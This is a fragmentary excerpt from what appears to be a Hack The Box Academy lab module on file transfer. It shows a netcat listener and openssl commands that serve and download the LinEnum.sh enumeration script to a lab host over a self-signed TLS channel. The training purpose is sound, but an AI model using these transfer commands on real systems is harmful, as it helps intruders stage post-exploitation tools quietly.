...
```shell-session
Hillside_1@htb[/htb]$ sudo nc -lvnp 8000
...
![GTFObins page listing Unix binaries with functions like file upload and download, and associated ATT&CK techniques.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/24/gtfobins_download.jpg)
...
```shell-session
Hillside_1@htb[/htb]$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
...
```shell-session
Hillside_1@htb[/htb]$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```
...
```shell-session
Hillside_1@htb[/htb]$ openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```
